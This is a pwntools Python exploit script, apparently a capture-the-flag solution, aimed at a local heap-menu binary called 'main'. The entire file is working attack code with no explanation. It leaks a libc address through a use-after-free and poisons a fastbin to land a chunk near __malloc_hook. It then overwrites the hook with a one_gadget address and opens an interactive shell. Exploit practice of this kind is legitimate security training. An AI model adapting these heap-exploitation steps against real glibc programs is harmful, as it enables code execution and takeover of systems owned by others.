#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./main')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()




def c(idx):
    sla("Your choice: ",idx)

def malloc(name,attack,defence,speed):
    c(1)
    sla("player name: ",name)
    sla("attack points: ",attack)
    sla("defense points: ",defence)
    sla("Enter speed: ",speed)
    sla("Enter precision: ","")

def free(idx):
    c(2)
    sla("Enter index: ",idx)

def sel(idx):
    c(3)
    sla("Enter index: ",idx)

def fill(idx,data):
    c(4)
    if idx == 1:
        c(1)
        sla("new name: ",data)
    elif idx == 2:
        c(2)
        sla("points: ",data)
    elif idx == 3:
        c(3)
        sla("points: ",data)
    else:
        c(5)
        sla("precision: ",data)
    c(0)

def showp():
    c(5)

def show():
    c(6)


one = [0x45226,0x4527a,0xf03a4,0xf1247]
malloc("A"*0x88,"","","") #0
malloc("BBBB","","","")#1
malloc("CCCC","","","")#2
malloc("F"*0x80,"","","") # 3

sel(0)

free(0) 
showp()
ru("Name: ")
addr = u64(rc(8)[0:6].ljust(8,b"\x00"))
libc.address = addr - 0x3c4b78 
malloc_hook = libc.address + 0x3c4b10 - 0x23
shell = libc.address + one[2]
lg("addr",addr)
lg("libc",libc.address)
lg("malloc_hook",malloc_hook)

malloc("D"*0x67,"","","") #4

sel(0)
free(0)
sel(6)
showp()
malloc("H"*0x67,"","","") #5

free(0)

fill(1,"\x01"*0x67)
fill(1,(p64(malloc_hook)[0:6]+b"\x01").decode("iso-8859-1"))
fill(1,(p64(malloc_hook)).decode("iso-8859-1"))
malloc("Y"*0x67,"","","") #6
malloc((b"A"*0x67).decode("iso-8859-1"),"","","") #7

sel(4)
size = 0x67
for i in range(0x40):
    fill(1,"\x02"*size)
    size -= 1

fill(1,(b"\x02"*0x13+p64(shell)[0:6]+b"\x02").decode("iso-8859-1"))
fill(1,(b"\x02"*0x13+p64(shell)[0:6]).decode("iso-8859-1"))
input()


sla("Your choice: ",1)
input()

io.interactive()
